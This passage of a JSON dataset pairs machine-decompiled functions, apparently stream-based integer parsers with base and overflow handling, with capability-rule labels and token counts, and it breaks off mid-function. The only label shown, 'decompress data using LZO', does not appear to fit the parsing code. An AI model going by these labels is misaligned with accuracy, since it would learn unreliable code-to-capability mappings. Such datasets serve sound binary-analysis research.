piVar1 = iVar7 + 0x78;\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0044dfc0:\n            uVar8 = var_2ch;\n            iVar6 = uVar17;\n            if ((*(iVar7 + 0x10) == 0) || (*(iVar7 + 0x26) != iVar6)) {\n                if (iVar6 == *(iVar7 + 0x24)) goto code_r0x0044de10;\n                iVar3 = *piVar1;\n                piVar10 = piVar1;\n                uVar17 = var_50h;\n                while (iVar3 != iVar6) {\n                    piVar10 = piVar10 + 1;\n                    uVar17 = uVar17 - 1;\n                    if (uVar17 == 0) goto code_r0x0044de10;\n                    iVar3 = *piVar10;\n                }\n                iVar9 = piVar10 - piVar1 >> 1;\n                if (0x1e < piVar10 - piVar1) {\n                    iVar9 = iVar9 + -6;\n                }\n                if (var_48h <= uVar18 / var_40h) {\n                    uVar17 = var_48h * var_40h;\n                    var_48h = iVar9 + uVar17;\n                    var_43h = var_43h | uVar18 - iVar9 < uVar17;\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0044e013;\n                }\n                uVar17 = arg_8h[2];\n                var_43h = uVar2;\n                if (uVar17 < arg_8h[3]) goto code_r0x0044e022;\ncode_r0x0044e0e8:\n                (**(*arg_8h + 0x28))();\n                var_56h = uVar2;\n                if (arg_8h != NULL) goto code_r0x0044e031;\n            }\n            else {\n                if (uVar19 == 0) {\n                    var_42h = *(iVar7 + 0x10);\n                    uVar2 = 0;\n                    goto code_r0x0044dca8;\n                }\n                uVar17 = var_2ch + 1;\n                uVar14 = 0xf;\n                if (stack0xffffffcc != var_64h) {\n                    uVar14 = var_28h;\n                }\n                if (uVar14 < uVar17) {\n                    fcn.00492830(var_2ch, 0, 0, 1);\n                }\n                *(stack0xffffffcc + uVar8) = uVar19;\n                *(stack0xffffffcc + uVar17) = 0;\n                uVar19 = 0;\n                var_2ch = uVar17;\ncode_r0x0044e013:\n                uVar17 = arg_8h[2];\n                if (arg_8h[3] <= uVar17) goto code_r0x0044e0e8;\ncode_r0x0044e022:\n                arg_8h[2] = uVar17 + 2;\ncode_r0x0044e031:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar6 = *arg_8h[2];\n                }\n                else {\n                    iVar6 = (**(*arg_8h + 0x24))();\n                }\n                var_56h = 0;\n                if (iVar6 == -1) {\n                    arg_8h = NULL;\n                    var_56h = uVar2;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar13 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar6 = *arg_10h[2];\n                }\n                else {\n                    iVar6 = (**(*arg_10h + 0x24))();\n                }\n                bVar13 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar13 = bVar15;\n                }\n            }\n            if (bVar13 == var_56h) goto code_r0x0044dca8;\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            goto code_r0x0044dfc0;\n        }\n        var_48h = 0;\n        var_43h = 0;\n        var_42h = 0;\n        uVar2 = uVar4;\n    }\ncode_r0x0044dca8:\n    if (var_2ch != 0) goto code_r0x0044de1f;\ncode_r0x0044dcb0:\n    if ((uVar19 != 0) || (bVar11)) {\ncode_r0x0044de61:\n        if (var_42h == 0) {\n            if (var_43h == 0) {\n                uVar18 = -var_48h;\n                if (!bVar12) {\n                    uVar18 = var_48h;\n                }\n                *arg_20h = uVar18;\n            }\n            else {\n                *arg_20h = bVar12 + 0x7fffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x0044dcd4;\n        }\n    }\ncode_r0x0044dcc2:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x0044dcd4:\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_64h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x0044df80:\n    if (5 < uVar16 - 0x41) goto code_r0x0044de10;\n    iVar9 = uVar17 - 0x37;\n    goto code_r0x0044dc15;\ncode_r0x0044de10:\n    uVar2 = 0;\n    if (var_2ch == 0) goto code_r0x0044dcb0;\ncode_r0x0044de1f:\n    fcn.004929c0(uVar19);\n    cVar5 = fcn.0049e840(*(iVar7 + 8), *(iVar7 + 0xc), &var_31h + 1);\n    if (cVar5 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar11) || ((uVar19 | var_2ch) != 0)) goto code_r0x0044de61;\n    goto code_r0x0044dcc2;\n}\n",
        "token_count": 5156
    },
    "0044e460": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0044e460(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    int16_t *piVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    char cVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    bool bVar10;\n    bool bVar11;\n    bool bVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint *var_60h;\n    uint var_5ch;\n    uint var_57h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t var_43h;\n    uint8_t var_42h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar4 = arg_18h;\n    iVar8 = fcn.0042e500(arg_18h + 0x6c);\n    var_40h = 8;\n    uVar18 = *(iVar4 + 0xc) & 0x4a;\n    if ((uVar18 != 0x40) && (var_40h = 10,  uVar18 == 8)) {\n        var_40h = 0x10;\n    }\n    bVar11 = arg_8h != NULL && arg_ch == -1;\n    bVar10 = arg_ch == -1;\n    if (bVar11) {\n        if (arg_8h[2] < arg_8h[3]) {\n            iVar7 = *arg_8h[2];\n        }\n        else {\n            iVar7 = (**(*arg_8h + 0x24))();\n        }\n        bVar10 = false;\n        if (iVar7 == -1) {\n            arg_8h = NULL;\n            bVar10 = bVar11;\n        }\n    }\n    bVar12 = arg_10h != NULL && arg_14h == -1;\n    bVar11 = arg_14h == -1;\n    if (bVar12) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar7 = *arg_10h[2];\n        }\n        else {\n            iVar7 = (**(*arg_10h + 0x24))();\n        }\n        bVar11 = false;\n        if (iVar7 == -1) {\n            arg_10h = NULL;\n            bVar11 = bVar12;\n        }\n    }\n    if (bVar11 == bVar10) {\n        cVar6 = *(iVar8 + 0x10);\n        bVar11 = false;\n        uVar17 = 0;\n        uVar19 = 0;\n        var_42h = 1;\n        bVar10 = false;\n    }\n    else {\n        uVar17 = arg_ch & 0xffff;\n        if ((arg_8h != NULL) && (arg_ch == -1)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar17 = *arg_8h[2];\n            }\n            else {\n                uVar17 = (**(*arg_8h + 0x24))();\n            }\n            if (uVar17 == -1) {\n                arg_8h = NULL;\n            }\n        }\n        cVar6 = *(iVar8 + 0x10);\n        iVar7 = uVar17;\n        bVar11 = *(iVar8 + 0x70) == iVar7;\n        if ((bVar11) || (*(iVar8 + 0x72) == iVar7)) {\n            if (((cVar6 == '\\0') || (*(iVar8 + 0x26) != iVar7)) && (*(iVar8 + 0x24) != iVar7)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_42h = fcn.00430e20(&arg_10h);\n                if (var_42h != 0) {\n                    cVar6 = *(iVar8 + 0x10);\n                    uVar19 = 0;\n                    bVar10 = false;\n                    goto code_r0x0044e63a;\n                }\n                uVar17 = fcn.00430f10();\n                cVar6 = *(iVar8 + 0x10);\n            }\n        }\n        else {\n            bVar11 = false;\n        }\n        bVar10 = false;\n        uVar19 = 0;\n        do {\n            iVar7 = uVar17;\n            if ((cVar6 != '\\0') && (*(iVar8 + 0x26) == iVar7)) {\n                var_42h = 0;\n                if (var_40h != 0x10) goto code_r0x0044e647;\n                var_28h = var_28h & 0xffffff00;\n                var_50h = 0x16;\n                goto code_r0x0044ecb0;\n            }\n            if (*(iVar8 + 0x24) == iVar7) break;\n            if (*(iVar8 + 0x78) == iVar7) {\n                bVar12 = var_40h == 10 | bVar10 ^ 1U;\n                if (!bVar12) goto code_r0x0044e5a2;\n                bVar10 = uVar18 == 0 || var_40h == 8;\n                if (uVar18 != 0 && var_40h != 8) {\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0044e5d6;\n                }\n                uVar19 = 0;\n                var_40h = 8;\n                uVar14 = arg_8h[2];\n                if (uVar14 < arg_8h[3]) goto code_r0x0044e5e5;\ncode_r0x0044e820:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0044e5f4;\n                var_48h._0_1_ = true;\n            }\n            else {\n                if (!bVar10) break;\ncode_r0x0044e5a2:\n                if ((*(iVar8 + 0x74) != iVar7) && (*(iVar8 + 0x76) != iVar7)) {\n                    var_42h = 0;\n                    bVar10 = true;\n                    goto code_r0x0044e63a;\n                }\n                var_42h = var_40h == 0x10 || uVar18 == 0;\n                if (var_40h != 0x10 && uVar18 != 0) {\n                    bVar10 = true;\n                    goto code_r0x0044e647;\n                }\n                bVar12 = false;\n                uVar19 = 0;\n                var_40h = 0x10;\ncode_r0x0044e5d6:\n                uVar14 = arg_8h[2];\n                bVar10 = bVar12;\n                if (arg_8h[3] <= uVar14) goto code_r0x0044e820;\ncode_r0x0044e5e5:\n                arg_8h[2] = uVar14 + 2;\ncode_r0x0044e5f4:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar7 = *arg_8h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_8h + 0x24))();\n                }\n                var_48h._0_1_ = false;\n                if (iVar7 == -1) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar12 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar7 = *arg_10h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_10h + 0x24))();\n                }\n                bVar12 = false;\n                if (iVar7 == -1) {\n                    arg_10h = NULL;\n                    bVar12 = bVar15;\n                }\n            }\n            if (var_48h._0_1_ == bVar12) {\n                var_42h = 1;\n                cVar6 = *(iVar8 + 0x10);\n                goto code_r0x0044e63a;\n            }\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar6 = *(iVar8 + 0x10);\n        } while (bVar10);\n        var_42h = 0;\n    }\ncode_r0x0044e63a:\n    var_50h = 0x16;\n    if (var_40h != 0x10) {\ncode_r0x0044e647:\n        var_50h = var_40h;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (cVar6 != '\\0') {\ncode_r0x0044ecb0:\n        stack0xffffffcc = &var_28h;\n        var_2ch = 0;\n        fcn.004924e0(0x20);\n    }\n    uVar5 = var_42h;\n    var_60h = &var_28h;\n    uVar18 = 0xffffffff / var_40h;\n    uVar2 = *(iVar8 + 0xa4);\n    if (uVar2 == 0) {\n        if (var_42h == 0) {\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0044e6a8:\n            uVar16 = uVar17;\n            uVar17 = uVar17 & 0xffff;\n            if (var_50h < 0xb) {\n                if ((uVar16 < 0x30) || (var_50h + 0x30U <= uVar16)) goto code_r0x0044e8d0;\n            }\n            else if (9 < uVar16 - 0x30) goto code_r0x0044e8ad;\n            uVar17 = uVar17 - 0x30;\ncode_r0x0044e6cc:\n            if (uVar17 != 0xffffffff) {\n                do {\n                    if (uVar18 < var_48h) {\n                        var_43h = 1;\n                        uVar17 = arg_8h[2];\n                        if (uVar17 < arg_8h[3]) goto code_r0x0044e70a;\ncode_r0x0044e963:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044e719;\n                        var_4ch._0_1_ = true;\n                    }\n                    else {\n                        var_43h = var_43h | ~uVar17 < var_48h * var_40h;\n                        var_48h = uVar17 + var_48h * var_40h;\n                        uVar19 = uVar19 + 1;\n                        uVar17 = arg_8h[2];\n                        if (arg_8h[3] <= uVar17) goto code_r0x0044e963;\ncode_r0x0044e70a:\n                        arg_8h[2] = uVar17 + 2;\ncode_r0x0044e719:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_4ch._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_4ch._0_1_ = true;\n                        }\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar15 = arg_10h != NULL && arg_14h == -1;\n                    bVar12 = arg_14h == -1;\n                    if (bVar15) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar12 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar12 = bVar15;\n                        }\n                    }\n                    if (var_4ch._0_1_ == bVar12) {\n                        uVar2 = 1;\n                        goto code_r0x0044e75e;\n                    }\n                    uVar17 = 0xffff;\n                    if (arg_8h == NULL) goto code_r0x0044e6a8;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar17 = *arg_8h[2];\n                    }\n                    else {\n                        uVar17 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar16 = uVar17;\n                    if (uVar16 != 0xffff) goto code_r0x0044e6a8;\n                    arg_8h = NULL;\n                    if (var_50h < 0xb) break;\n                    uVar17 = 0xffff;\ncode_r0x0044e8ad:\n                    if (5 < uVar16 - 0x61) goto code_r0x0044ea30;\n                    uVar17 = uVar17 - 0x57;\n                    if (uVar17 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x0044e8d0;\n        }\n        var_43h = 0;\n        var_42h = 0;\n        var_48h = 0;\n        uVar2 = uVar5;\n    }\n    else {\n        if (var_42h == 0) {\n            piVar1 = iVar8 + 0x78;\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0044ea70:\n            uVar14 = var_2ch;\n            iVar7 = uVar17;\n            if ((*(iVar8 + 0x10) == 0) || (*(iVar8 + 0x26) != iVar7)) {\n                if (iVar7 == *(iVar8 + 0x24)) goto code_r0x0044e8d0;\n                iVar3 = *piVar1;\n                piVar9 = piVar1;\n                uVar17 = var_50h;\n                while (iVar3 != iVar7) {\n                    piVar9 = piVar9 + 1;\n                    uVar17 = uVar17 - 1;\n                    if (uVar17 == 0) goto code_r0x0044e8d0;\n                    iVar3 = *piVar9;\n                }\n                uVar17 = piVar9 - piVar1 >> 1;\n                if (0x1e < piVar9 - piVar1) {\n                    uVar17 = uVar17 - 6;\n                }\n                if (var_48h <= uVar18) {\n                    uVar14 = var_48h * var_40h;\n                    var_48h = uVar17 + uVar14;\n                    var_43h = var_43h | ~uVar17 < uVar14;\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0044eac3;\n                }\n                uVar17 = arg_8h[2];\n                var_43h = uVar2;\n                if (uVar17 < arg_8h[3]) goto code_r0x0044ead2;\ncode_r0x0044eb98:\n                (**(*arg_8h + 0x28))();\n                var_57h._1_1_ = uVar2;\n                if (arg_8h != NULL) goto code_r0x0044eae1;\n            }\n            else {\n                if (uVar19 == 0) {\n                    var_42h = *(iVar8 + 0x10);\n                    uVar2 = 0;\n                    goto code_r0x0044e75e;\n                }\n                uVar17 = var_2ch + 1;\n                uVar13 = 0xf;\n                if (stack0xffffffcc != var_60h) {\n                    uVar13 = var_28h;\n                }\n                if (uVar13 < uVar17) {\n                    fcn.00492830(var_2ch, 0, 0, 1);\n                }\n                *(stack0xffffffcc + uVar14) = uVar19;\n                *(stack0xffffffcc + uVar17) = 0;\n                uVar19 = 0;\n                var_2ch = uVar17;\ncode_r0x0044eac3:\n                uVar17 = arg_8h[2];\n                if (arg_8h[3] <= uVar17) goto code_r0x0044eb98;\ncode_r0x0044ead2:\n                arg_8h[2] = uVar17 + 2;\ncode_r0x0044eae1:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar7 = *arg_8h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_8h + 0x24))();\n                }\n                var_57h._1_1_ = 0;\n                if (iVar7 == -1) {\n                    arg_8h = NULL;\n                    var_57h._1_1_ = uVar2;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar12 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar7 = *arg_10h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_10h + 0x24))();\n                }\n                bVar12 = false;\n                if (iVar7 == -1) {\n                    arg_10h = NULL;\n                    bVar12 = bVar15;\n                }\n            }\n            if (bVar12 == var_57h._1_1_) goto code_r0x0044e75e;\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            goto code_r0x0044ea70;\n        }\n        var_48h = 0;\n        var_43h = 0;\n        var_42h = 0;\n        uVar2 = uVar5;\n    }\ncode_r0x0044e75e:\n    if (var_2ch != 0) goto code_r0x0044e8df;\ncode_r0x0044e770:\n    if ((uVar19 != 0) || (bVar10)) {\ncode_r0x0044e921:\n        if (var_42h == 0) {\n            if (var_43h == 0) {\n                uVar18 = -var_48h;\n                if (!bVar11) {\n                    uVar18 = var_48h;\n                }\n                *arg_20h = uVar18;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x0044e794;\n        }\n    }\ncode_r0x0044e782:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x0044e794:\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_60h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x0044ea30:\n    if (5 < uVar16 - 0x41) goto code_r0x0044e8d0;\n    uVar17 = uVar17 - 0x37;\n    goto code_r0x0044e6cc;\ncode_r0x0044e8d0:\n    uVar2 = 0;\n    if (var_2ch == 0) goto code_r0x0044e770;\ncode_r0x0044e8df:\n    fcn.004929c0(uVar19);\n    cVar6 = fcn.0049e840(*(iVar8 + 8), *(iVar8 + 0xc), &var_31h + 1);\n    if (cVar6 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar10) || ((uVar19 | var_2ch) != 0)) goto code_r0x0044e921;\n    goto code_r0x0044e782;\n}\n",
        "token_count": 5175
    },
    "0044ef10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0044ef10(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint16_t *arg_20h)\n\n{\n    int16_t *piVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    char cVar7;\n    bool bVar8;\n    int16_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int16_t *piVar13;\n    bool bVar14;\n    uint16_t uVar15;\n    uint8_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint var_5ch;\n    uint *var_58h;\n    uint var_54h;\n    uint32_t var_4fh;\n    uint var_48h;\n    uint16_t var_44h;\n    uint8_t var_42h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    iVar12 = arg_18h;\n    iVar10 = fcn.0042e500(arg_18h + 0x6c);\n    var_40h = 8;\n    uVar18 = *(iVar12 + 0xc) & 0x4a;\n    if ((uVar18 != 0x40) && (var_40h = 10,  uVar18 == 8)) {\n        var_40h = 0x10;\n    }\n    bVar4 = arg_8h != NULL && arg_ch == -1;\n    bVar14 = arg_ch == -1;\n    if (bVar4) {\n        if (arg_8h[2] < arg_8h[3]) {\n            iVar9 = *arg_8h[2];\n        }\n        else {\n            iVar9 = (**(*arg_8h + 0x24))();\n        }\n        bVar14 = false;\n        if (iVar9 == -1) {\n            arg_8h = NULL;\n            bVar14 = bVar4;\n        }\n    }\n    bVar4 = arg_10h != NULL && arg_14h == -1;\n    bVar5 = arg_14h == -1;\n    if (bVar4) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar9 = *arg_10h[2];\n        }\n        else {\n            iVar9 = (**(*arg_10h + 0x24))();\n        }\n        bVar5 = false;\n        if (iVar9 == -1) {\n            arg_10h = NULL;\n            bVar5 = bVar4;\n        }\n    }\n    if (bVar5 == bVar14) {\n        cVar7 = *(iVar10 + 0x10);\n        bVar4 = false;\n        uVar17 = 0;\n        uVar19 = 0;\n        var_42h = 1;\n        bVar14 = false;\n    }\n    else {\n        uVar17 = arg_ch & 0xffff;\n        if ((arg_8h != NULL) && (arg_ch == -1)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar17 = *arg_8h[2];\n            }\n            else {\n                uVar17 = (**(*arg_8h + 0x24))();\n            }\n            if (uVar17 == -1) {\n                arg_8h = NULL;\n            }\n        }\n        cVar7 = *(iVar10 + 0x10);\n        iVar9 = uVar17;\n        bVar4 = *(iVar10 + 0x70) == iVar9;\n        if ((bVar4) || (*(iVar10 + 0x72) == iVar9)) {\n            if (((cVar7 == '\\0') || (*(iVar10 + 0x26) != iVar9)) && (*(iVar10 + 0x24) != iVar9)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_42h = fcn.00430e20(&arg_10h);\n                if (var_42h != 0) {\n                    cVar7 = *(iVar10 + 0x10);\n                    uVar19 = 0;\n                    bVar14 = false;\n                    goto code_r0x0044f0fa;\n                }\n                uVar17 = fcn.00430f10();\n                cVar7 = *(iVar10 + 0x10);\n            }\n        }\n        else {\n            bVar4 = false;\n        }\n        bVar14 = false;\n        uVar19 = 0;\n        do {\n            iVar9 = uVar17;\n            if ((cVar7 != '\\0') && (*(iVar10 + 0x26) == iVar9)) {\n                var_42h = 0;\n                if (var_40h != 0x10) goto code_r0x0044f107;\n                var_28h = var_28h & 0xffffff00;\n                stack0xffffffb0 = 0x16;\n                goto code_r0x0044f7d0;\n            }\n            if (*(iVar10 + 0x24) == iVar9) break;\n            if (*(iVar10 + 0x78) == iVar9) {\n                bVar5 = var_40h == 10 | bVar14 ^ 1U;\n                if (!bVar5) goto code_r0x0044f062;\n                bVar14 = uVar18 == 0 || var_40h == 8;\n                if (uVar18 != 0 && var_40h != 8) {\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0044f096;\n                }\n                uVar19 = 0;\n                var_40h = 8;\n                uVar11 = arg_8h[2];\n                if (uVar11 < arg_8h[3]) goto code_r0x0044f0a5;\ncode_r0x0044f2f0:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0044f0b4;\n                var_44h._0_1_ = true;\n            }\n            else {\n                if (!bVar14) break;\ncode_r0x0044f062:\n                if ((*(iVar10 + 0x74) != iVar9) && (*(iVar10 + 0x76) != iVar9)) {\n                    var_42h = 0;\n                    bVar14 = true;\n                    goto code_r0x0044f0fa;\n                }\n                var_42h = var_40h == 0x10 || uVar18 == 0;\n                if (var_40h != 0x10 && uVar18 != 0) {\n                    bVar14 = true;\n                    goto code_r0x0044f107;\n                }\n                bVar5 = false;\n                uVar19 = 0;\n                var_40h = 0x10;\ncode_r0x0044f096:\n                uVar11 = arg_8h[2];\n                bVar14 = bVar5;\n                if (arg_8h[3] <= uVar11) goto code_r0x0044f2f0;\ncode_r0x0044f0a5:\n                arg_8h[2] = uVar11 + 2;\ncode_r0x0044f0b4:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar9 = *arg_8h[2];\n                }\n                else {\n                    iVar9 = (**(*arg_8h + 0x24))();\n                }\n                var_44h._0_1_ = false;\n                if (iVar9 == -1) {\n                    arg_8h = NULL;\n                    var_44h._0_1_ = true;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar8 = arg_10h != NULL && arg_14h == -1;\n            bVar5 = arg_14h == -1;\n            if (bVar8) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar9 = *arg_10h[2];\n                }\n                else {\n                    iVar9 = (**(*arg_10h + 0x24))();\n                }\n                bVar5 = false;\n                if (iVar9 == -1) {\n                    arg_10h = NULL;\n                    bVar5 = bVar8;\n                }\n            }\n            if (var_44h._0_1_ == bVar5) {\n                var_42h = 1;\n                cVar7 = *(iVar10 + 0x10);\n                goto code_r0x0044f0fa;\n            }\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar7 = *(iVar10 + 0x10);\n        } while (bVar14);\n        var_42h = 0;\n    }\ncode_r0x0044f0fa:\n    stack0xffffffb0 = 0x16;\n    if (var_40h != 0x10) {\ncode_r0x0044f107:\n        stack0xffffffb0 = var_40h;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (cVar7 != '\\0') {\ncode_r0x0044f7d0:\n        stack0xffffffcc = &var_28h;\n        var_2ch = 0;\n        fcn.004924e0(0x20);\n    }\n    uVar16 = var_42h;\n    var_58h = &var_28h;\n    uVar2 = *(iVar10 + 0xa4);\n    var_54h._0_2_ = 0xffff / var_40h;\n    if (uVar2 == 0) {\n        if (var_42h == 0) {\n            var_4fh._2_1_ = 0;\n            var_44h = 0;\ncode_r0x0044f166:\n            uVar15 = uVar17;\n            uVar17 = uVar17 & 0xffff;\n            if (stack0xffffffb0 < 0xb) {\n                if ((uVar15 < 0x30) || (stack0xffffffb0 + 0x30U <= uVar15)) goto code_r0x0044f3a0;\n            }\n            else if (9 < uVar15 - 0x30) goto code_r0x0044f37d;\n            iVar12 = uVar17 - 0x30;\ncode_r0x0044f18a:\n            if (iVar12 != -1) {\n                do {\n                    if (var_54h < var_44h) {\n                        var_4fh._2_1_ = 1;\n                        uVar18 = arg_8h[2];\n                        if (uVar18 < arg_8h[3]) goto code_r0x0044f1d5;\ncode_r0x0044f463:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044f1e4;\n                        bVar5 = true;\n                    }\n                    else {\n                        var_4fh._2_1_ = var_4fh._2_1_ | 0xffff - iVar12 < var_44h * var_40h;\n                        var_44h = iVar12 + var_44h * var_40h;\n                        uVar19 = uVar19 + 1;\n                        uVar18 = arg_8h[2];\n                        if (arg_8h[3] <= uVar18) goto code_r0x0044f463;\ncode_r0x0044f1d5:\n                        arg_8h[2] = uVar18 + 2;\ncode_r0x0044f1e4:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar9 = *arg_8h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_8h + 0x24))();\n                        }\n                        bVar5 = false;\n                        if (iVar9 == -1) {\n                            arg_8h = NULL;\n                            bVar5 = true;\n                        }\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar6 = arg_10h != NULL && arg_14h == -1;\n                    bVar8 = arg_14h == -1;\n                    if (bVar6) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar9 = *arg_10h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar8 = false;\n                        if (iVar9 == -1) {\n                            arg_10h = NULL;\n                            bVar8 = bVar6;\n                        }\n                    }\n                    if (bVar5 == bVar8) {\n                        uVar2 = 1;\n                        goto code_r0x0044f22e;\n                    }\n                    uVar17 = 0xffff;\n                    if (arg_8h == NULL) goto code_r0x0044f166;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar17 = *arg_8h[2];\n                    